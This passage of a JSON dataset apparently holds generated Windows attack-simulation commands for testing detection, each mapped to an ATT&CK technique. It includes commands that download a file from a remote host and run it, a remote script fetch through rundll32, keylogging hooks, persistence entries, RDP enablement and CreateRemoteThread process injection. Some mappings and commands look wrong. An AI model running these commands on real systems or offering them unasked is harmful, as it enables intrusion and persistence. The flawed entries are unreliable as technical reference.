      "safety_level": "medium",
      "expected_behavior": "Notepad.exe starts briefly, memory is allocated in context, then process is terminated. No actual code injection occurs. Safe for testing memory allocation detection.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:21.599228",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "abf1cfcc-4f0a-42af-b58b-6a7ec3f291bd",
      "ttp_id": "unknown",
      "technique_id": "T1055.012",
      "technique_name": "Process Hollowing",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://192.168.1.100/payload.bin %TEMP%\\\\svchost.exe & start /b %TEMP%\\\\svchost.exe & timeout /t 5 /nobreak > NUL & taskkill /im svchost.exe /f 2>NUL",
      "description": "Uses certutil to download a binary disguised as svchost, executes it, and kills it after 5 seconds to simulate short-lived malicious process.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads payload.bin to %TEMP%\\svchost.exe, runs it silently, waits 5 seconds, then terminates. Simulates fileless-like execution with cleanup.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:21.599228",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e140b2fa-b008-4d4b-af51-3ddc6e3e2191",
      "ttp_id": "unknown",
      "technique_id": "T1090",
      "technique_name": "Command and Control",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& { $sock = New-Object System.Net.Sockets.TCPClient('example.com', 8080); $sock.Close() }\"",
      "description": "Establishes a TCP connection to a remote server, simulating Command and Control (C2) communication",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The command will attempt to establish a connection to the specified remote server and then close it.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:21:18.585675",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ef389114-35ae-4a79-91d7-bd1935a1d42b",
      "ttp_id": "unknown",
      "technique_id": "T1100",
      "technique_name": "Command and Control",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -f http://example.com/malicious.exe %TEMP%\\malicious.exe && %TEMP%\\malicious.exe",
      "description": "Downloads a file from a remote server and executes it, simulating Command and Control (C2) communication",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "The command will download the specified file and execute it. PLEASE NOTE: THIS COMMAND IS FOR TESTING ONLY AND SHOULD NOT BE USED WITH ACTUAL MALICIOUS PAYLOADS.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:21:18.585675",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ee61b0ee-55c3-4389-a7e9-6a5c03c0c1b5",
      "ttp_id": "unknown",
      "technique_id": "T1101",
      "technique_name": "Command and Control",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& { $web = New-Object System.Net.WebClient(); $web.DownloadString('http://example.com/command') }\"",
      "description": "Downloads a string from a remote server, simulating Command and Control (C2) communication",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The command will download the string from the specified remote server.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:21:18.585675",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7f17c45c-a145-4d01-aa13-c49b5bdfdb18",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "Remote Desktop Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "mstsc /v:192.0.2.100:3389",
      "description": "Basic RDP connection initiation using built-in client. Prompts GUI for credentials.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Launches Windows RDP client GUI attempting connection to 192.0.2.100:3389. Requires valid credentials for completion.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:16.884220",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e5acf5e1-f642-4594-80b5-29584c97cb6d",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "Remote Desktop Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f && sc start TermService",
      "description": "Intermediate RDP enablement via registry modification and service start",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Enables RDP access by setting registry key to allow connections (0) and starts Terminal Services. Requires reboot for full effect if service was disabled.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:16.884220",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e60ff5fa-cf8f-47af-9c8a-70cdc72f4d40",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "Remote Desktop Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c \"sc config TermService start= auto && sc start TermService && timeout /t 3 && mstsc /v:192.0.2.100:3389\"",
      "description": "Advanced service configuration and connection chain",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Configures Terminal Service for automatic start, forces service start, adds 3-second delay, then initiates RDP connection. Makes persistent configuration changes.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:16.884220",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a488735f-d6b6-41dc-8c58-57f1b0452728",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Write-Host 'Test'\"",
      "description": "Basic PowerShell command to test detection",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints 'Test' to the console",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:19.953913",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c97bdaff-cace-45fe-a7c2-04dafbcd0425",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& {Write-Host 'Test'; Get-Process}\"",
      "description": "Intermediate PowerShell command with script block",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints 'Test' to the console and lists running processes",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:19.953913",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "897ac950-5a50-4850-a68c-1d3abf01f7d6",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& {Compress-Archive -Path '%TEMP%\\test.txt' -DestinationPath '%TEMP%\\test.zip' -Force; Remove-Item -Path '%TEMP%\\test.txt' -ErrorAction SilentlyContinue}\"",
      "description": "Advanced PowerShell command with file operations",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a zip archive of a test file and then removes the original file",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:19.953913",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7cc82f7e-6f78-4372-ab89-b5d862aa603b",
      "ttp_id": "unknown",
      "technique_id": "T1083",
      "technique_name": "File and Directory Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "dir C:\\\\Program Files\\\\*.* /b",
      "description": "Detects Amadey searching for product names from South Korean companies by listing files in Program Files directory",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists files in Program Files directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:19.940239",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "cc079cac-ba7e-4cc6-9983-9e4b2224b911",
      "ttp_id": "unknown",
      "technique_id": "T1083",
      "technique_name": "File and Directory Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "for /f \"delims=\" %a in ('dir /b C:\\\\Program Files\\\\*.*') do echo %a",
      "description": "Detects Amadey searching for product names from South Korean companies by listing files in Program Files directory using a for loop",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists files in Program Files directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:19.941249",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3ef0b3a7-43d7-488f-ad10-62c38c286454",
      "ttp_id": "unknown",
      "technique_id": "T1218.011",
      "technique_name": "Defensive Evasion",
      "tactic": "execution",
      "platform": "windows",
      "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject('script:https://example.com/malicious.sct')",
      "description": "Abuse Rundll32 to execute a remote script via Windows Script Component (SCT) using a JavaScript execution vector.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Rundll32 loads the JavaScript runtime, attempts to fetch and execute a remote SCT file. Network connection will fail if URL is unreachable. No local payload written.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:52.180110",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4bc2707d-14ad-4d55-9e27-be6360d59e57",
      "ttp_id": "unknown",
      "technique_id": "T1218.011",
      "technique_name": "Defensive Evasion",
      "tactic": "execution",
      "platform": "windows",
      "command": "rundll32.exe %TEMP%\\stage.dll,EntryPoint",
      "description": "Execute a malicious DLL function via Rundll32 from the temp directory, simulating staged payload execution.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Rundll32 attempts to load and execute EntryPoint function from a DLL in %TEMP%. Will fail if file does not exist. Used commonly in post-exploitation.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:52.181160",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "fb7751f0-0c9c-40f9-818a-c10af48f6635",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Defensive Evasion",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX (Get-Content -Path '%TEMP%\\\\encoded_payload.txt' -ErrorAction SilentlyContinue)\"",
      "description": "Decode and execute a PowerShell command from a local file, simulating staged encoded command execution.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "PowerShell reads a local file containing a benign script block (e.g. Write-Host 'Simulated Malware'), then executes it. Fails silently if file is missing.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:52.181160",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9dad06cd-3b16-4614-920b-c9ec927a79e5",
      "ttp_id": "unknown",
      "technique_id": "T1018",
      "technique_name": "System Information Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "systeminfo",
      "description": "Retrieve system information using systeminfo command",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays system information, including OS version, hardware, and network settings",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.395566",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ac02dc9d-9e97-4f64-9eb8-cefa27e40905",
      "ttp_id": "unknown",
      "technique_id": "T1018",
      "technique_name": "System Information Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Get-WmiObject -Class Win32_OperatingSystem\"",
      "description": "Retrieve system information using PowerShell WMI",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays system information, including OS version and hardware",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.395566",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "794300a8-fc2e-4bcb-a74f-bb501d61a7e2",
      "ttp_id": "unknown",
      "technique_id": "T1018",
      "technique_name": "System Information Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "wmic os get /value",
      "description": "Retrieve system information using WMIC",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays system information, including OS version and hardware",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.395566",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4bcf88a9-5f17-4695-96a5-b0e4aa2f290c",
      "ttp_id": "unknown",
      "technique_id": "T1083",
      "technique_name": "File and Directory Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& { $results = @(); $drives = Get-WmiObject -Class Win32_LogicalDisk -Filter \\\"DriveType = 3\\\" | Select-Object -ExpandProperty DeviceID; foreach ($drive in $drives) { $path = [System.IO.Path]::Combine($drive, 'Users', '*', 'Desktop', '*.*'); if (Test-Path $path) { $files = Get-ChildItem -Path $path -File -ErrorAction SilentlyContinue; $results += $files | Select-Object FullName,Length } }; $results }\"",
      "description": "Advanced discovery of files on desktops of all user profiles on local drives using WMI and filesystem access",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Identifies mounted local drives, constructs paths to all user Desktop folders, checks existence, and lists files found; requires admin to access other user profiles",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:52.717477",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4707fecb-c7df-483b-b41d-c9d7298f188c",
      "ttp_id": "unknown",
      "technique_id": "T1003",
      "technique_name": "Credential Access",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -AssemblyName System.Security; $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x1000); $buffer = [byte[]]::new(0x1000); $size = $buffer.Length; [System.Security.Cryptography.ProtectedData]::Unprotect($buffer, $ptr, $size)\"",
      "description": "Detects the use of Mimikatz for potential credential theft using PowerShell",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The command attempts to access protected data, which may trigger detection rules.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.214306",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "892d2299-c1e7-407a-b6fc-bf95789279b3",
      "ttp_id": "unknown",
      "technique_id": "T1003",
      "technique_name": "Credential Access",
      "tactic": "execution",
      "platform": "windows",
      "command": "net session",
      "description": "Lists active sessions on the system, potentially revealing credential information",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "The command lists active sessions on the system, which may reveal credential information.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.214306",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "06e60b85-a4f8-460b-a86b-aa56d43a4c75",
      "ttp_id": "unknown",
      "technique_id": "T1003",
      "technique_name": "Credential Access",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-Expression -Command '(New-Object System.Management.Automation.PsCredential 'test', (New-Object System.Security.SecureString)).GetNetworkCredential().Password'\"",
      "description": "Creates a new PsCredential object and extracts the password, potentially revealing credential information",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command creates a new PsCredential object and extracts the password, which may reveal credential information.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:18.214306",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "8d149304-7dfd-41c0-b420-8929abb0dcb0",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "Collection",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern int SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hInstance, uint threadId);' -Name U32 -Namespace W; $hook = [W.U32]::SetWindowsHookEx(13, { param($nCode, $wParam, $lParam) if ($nCode -ge 0) { $str = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($lParam) } 0 }, [IntPtr]::Zero, [uint]0); while ($true) { Start-Sleep -Milliseconds 100 }\"",
      "description": "Simulate keystroke logging using a basic Windows hook",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command will hang and not terminate",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:19.431293",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "0ab5b67a-171e-4012-a388-52e75c0e9c72",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "Collection",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Runtime.InteropServices.Marshal]::AllocHGlobal([int]1024); $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([int]1024); $hook = [W.U32]::SetWindowsHookEx(13, { param($nCode, $wParam, $lParam) if ($nCode -ge 0) { $str = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($lParam) } 0 }, [IntPtr]::Zero, [uint]0); [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ptr) -ErrorAction SilentlyContinue\"",
      "description": "Simulate keystroke logging using an intermediate Windows hook with memory allocation",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The command will allocate memory and then free it, simulating keystroke logging",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:19.431293",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e584ccd3-38ce-4d9a-99f1-04a6766be038",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "Collection",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern int SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hInstance, uint threadId); [DllImport(\"kernel32.dll\")] public static extern IntPtr GetModuleHandle(string lpModuleName);' -Name U32 -Namespace W; $hook = [W.U32]::SetWindowsHookEx(13, { param($nCode, $wParam, $lParam) if ($nCode -ge 0) { $str = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($lParam) } 0 }, [W.U32]::GetModuleHandle('user32'), [uint]0); Start-Process -FilePath 'notepad' -ErrorAction SilentlyContinue\"",
      "description": "Simulate keystroke logging using an advanced Windows hook with a separate process",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The command will launch notepad and simulate keystroke logging",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:19.431293",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "72d8565f-87e6-455f-8295-74be02388f16",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "autoit3 C:\\\\Windows\\\\Temp\\\\evil_script.au3",
      "description": "Execute an AutoIt script directly using the AutoIt interpreter.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The AutoIt interpreter runs the specified script. If the script is malicious, it may perform actions like spawning shells, modifying registry keys, or downloading payloads. This assumes AutoIt is installed on the system.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:53.631429",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5b307a48-f629-48d9-ac1d-42e8d89d69c6",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX (Get-Content -Path '%TEMP%\\\\encoded.au3' -ErrorAction SilentlyContinue)\"",
      "description": "Read and execute an AutoIt script from a file in the temp directory using PowerShell.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "PowerShell reads the content of the encoded AutoIt script stored locally and executes it in memory. This technique avoids direct disk execution of binaries but relies on PowerShell being available.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:53.631429",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9b42b2ee-fe65-4b92-b5cc-26cd54f1d3e3",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -decode \"%TEMP%\\\\script.b64\" \"%TEMP%\\\\decoded.au3\" && autoit3 \"%TEMP%\\\\decoded.au3\"",
      "description": "Decode a Base64-encoded AutoIt script using certutil and execute it.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Certutil decodes the Base64 script into a functional AutoIt script on disk, then the AutoIt interpreter executes it. This method abuses certutil, a legitimate Windows binary, to stage the payload.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:53.631429",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "32c9fb4c-0f7d-4a6d-975c-31cf7da109b5",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& {Start-Process -FilePath 'C:\\\\Windows\\\\System32\\\\svchost.exe' -ArgumentList '-k netsvcs'}\"",
      "description": "Basic: Start svchost.exe with netsvcs argument",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Starts svchost.exe process",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:19.431293",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3f4c1bb3-dbca-40b6-85bf-cbe2377d879e",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& {$bytes = [System.IO.File]::ReadAllBytes('C:\\\\Windows\\\\System32\\\\svchost.exe'); $process = New-Object System.Diagnostics.Process; $process.StartInfo.FileName = 'C:\\\\Windows\\\\System32\\\\svchost.exe'; $process.StartInfo.Arguments = '-k netsvcs'; $process.StartInfo.UseShellExecute = $false; $process.Start(); $process.WaitForExit()}\",",
      "description": "Intermediate: Read svchost.exe into bytes and start process",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Starts svchost.exe process",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:19.431293",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "688eeb9b-795d-4488-a540-d440bf3f410d",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& {Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; [DllImport(\"kernel32\")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId); [DllImport(\"kernel32\")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, int flAllocationType, int flProtect); [DllImport(\"kernel32\")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out int lpNumberOfBytesWritten); [DllImport(\"kernel32\")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, int dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, int dwCreationFlags, out IntPtr lpThreadId);'; $processId = (Get-Process -Name svchost).Id; $hProcess = [Example]::OpenProcess(0x1F0FFF, $false, $processId); $lpAddress = [Example]::VirtualAllocEx($hProcess, [IntPtr]::Zero, 0x1000, 0x1000, 0x40); $bytes = [System.Text.Encoding]::UTF8.GetBytes('Hello, World!'); [Example]::WriteProcessMemory($hProcess, $lpAddress, $bytes, $bytes.Length, [ref]$null); $lpStartAddress = $lpAddress; [Example]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $lpStartAddress, [IntPtr]::Zero, 0, [ref]$null)}\"",
      "description": "Advanced: Inject into svchost.exe process using CreateRemoteThread",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Injects into svchost.exe process",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:19.431293",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "730d16e7-a0b1-4be1-894d-06ccc9547f04",
      "ttp_id": "unknown",
      "technique_id": "T1543.003",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v TestRun /t REG_SZ /d \"cmd.exe /c echo TestRun > %TEMP%\\testrun.txt\" /f",
      "description": "Adds a Run registry entry for the current user that executes a benign command at logon.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A new value 'TestRun' is created under HKCU\\...\\Run; on next logon, cmd.exe writes a test file to %TEMP%.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:21.612663",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "39cc384c-64f9-4ae2-ab1e-ceb87520a6c9",
      "ttp_id": "unknown",
      "technique_id": "T1543.003",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "sc create TestService binPath= \"cmd.exe /c echo ServiceRun > %TEMP%\\servicerun.txt\" start= auto && sc start TestService",
      "description": "Creates and starts a Windows service that runs a benign command, demonstrating service creation.",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "A new service 'TestService' is installed and started; it writes a test file to %TEMP% and then exits.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:21.612663",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ecd0b005-b87d-46df-8559-e5ffb26041e1",
      "ttp_id": "unknown",
      "technique_id": "T1543.003",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "schtasks /Create /TN \"TestTask\" /TR \"cmd.exe /c echo TaskRun > %TEMP%\\taskrun.txt\" /SC ONLOGON /RL HIGHEST /F",
      "description": "Creates a scheduled task that runs at logon, executing a benign command.",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "A scheduled task named 'TestTask' is created; on next logon it runs and writes a test file to %TEMP%.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:21.612663",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "42a4693e-9305-4e9d-ba29-0c5d7ef5d0f1",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "rundll32.exe kernel32.dll,CreateRemoteThread",
      "description": "Basic process injection using rundll32 to create a remote thread in a target process (simulated injection)",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "rundll32.exe attempts to invoke CreateRemoteThread via DLL loading; this is a benign simulation and will likely fail without proper target process, but matches execution patterns for injection",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:52.280437",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7bfa6885-df57-44a7-9f34-299700a99a8d",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $src = \\\"[DllImport(\\\"kernel32\\\", SetLastError = true)] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);\\\"; $type = Add-Type -MemberDefinition $src -Name 'Win32' -PassThru; $proc = $type::OpenProcess(0x001F0FFF, $false, (Get-Process -Name 'notepad').Id); if ($proc) { Write-Host 'Injection point acquired' } } catch { Write-Host 'Injection failed' }\"",
      "description": "Intermediate process injection simulation using PowerShell P/Invoke to call OpenProcess on notepad.exe",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "PowerShell uses .NET P/Invoke to attempt access to a local process (notepad.exe). No actual code is injected; this only tests handle acquisition, which is a precursor to injection",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:52.280437",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "77634490-e753-4a06-831e-5c3bee0b0c24",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
